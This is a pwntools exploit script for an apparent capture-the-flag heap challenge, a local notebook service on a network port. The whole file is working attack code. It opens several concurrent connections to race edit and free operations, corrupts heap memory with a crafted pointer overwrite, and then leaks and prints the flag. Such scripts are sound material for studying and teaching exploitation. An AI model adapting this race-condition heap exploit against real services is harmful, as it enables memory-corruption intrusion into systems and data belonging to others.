from pwn import *
# context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

def cmd(p,c):
    p.sendlineafter(b" note\n",str(c).encode().ljust(9,b'\0'))
def add(p,ctx=b'n132', size=0x100, lv=0):
    cmd(p,1)
    p.sendlineafter(b"> ",str(size).encode())
    p.sendlineafter(b"> ",str(lv).encode())
    p.send(ctx)
def free(p,idx, size=0x100, lv=0):
    cmd(p,2)
    p.sendlineafter(b"> ",str(size).encode())
    p.sendlineafter(b"> ",str(lv).encode())
    p.sendlineafter(b"> ",str(idx).encode())
def show(p,idx, size=0x100, lv=0):
    cmd(p,3)
    p.sendlineafter(b"> ",str(size).encode())
    p.sendlineafter(b"> ",str(lv).encode())
    p.sendlineafter(b"> ",str(idx).encode())

def edit(p,idx,ctx, size=0x100, lv=0):
    cmd(p,4)
    p.sendlineafter(b"> ",str(size).encode())
    p.sendlineafter(b"> ",str(lv).encode())
    p.sendlineafter(b"> ",str(idx).encode())
    p.send(ctx)

r=process('./main')
r.readuntil(b"Current Notebook is running on port ")
port = int(r.readline())
p1 = remote("0.0.0.0",port)
p2 = remote("0.0.0.0",port)
p3 = remote("0.0.0.0",port)

p1.sendlineafter(b"\n",b"")
p2.sendlineafter(b"\n",b"")
p3.sendlineafter(b"\n",b"")


add(p1,b'init')
add(p1,b'\1',0x500)#1
add(p1,b'\2',0x500)#0

p4 = remote("0.0.0.0",port)
p4.sendlineafter(b"\n",b"")

cmd(p4,3)
p4.sendafter(b"> ",str(0x100).encode().ljust(0xf,b'\0'))
p4.sendafter(b"> ",str(0).encode().ljust(0xf,b'\0'))

cmd(p2,4)
p2.sendafter(b"> ",str(0x500).encode().ljust(0xf,b'\0'))
p2.sendafter(b"> ",str(0).encode().ljust(0xf,b'\0'))
# gdb.attach(r,'b *0x401B7E ')

p2.sendafter(b"> ",str(1).encode().ljust(0xf,b'\0'))
# p2 wait here

free(p3,1,0x500,0)
add(p1,b''.ljust(0x100,b'i'))
add(p1,b''.ljust(0x100,b'x'))
sleep(1)
p2.send((b'\0'*0x110 + p64(0x405110)*2).ljust(0x500,b'\0'))
p4.sendafter(b"> ",str(1).encode().ljust(0xf,b'\0'))
flag = p4.readline()[:-1]
warn(flag.decode())

p1.close()
p2.close()
p3.close()
p4.close()
r.close()
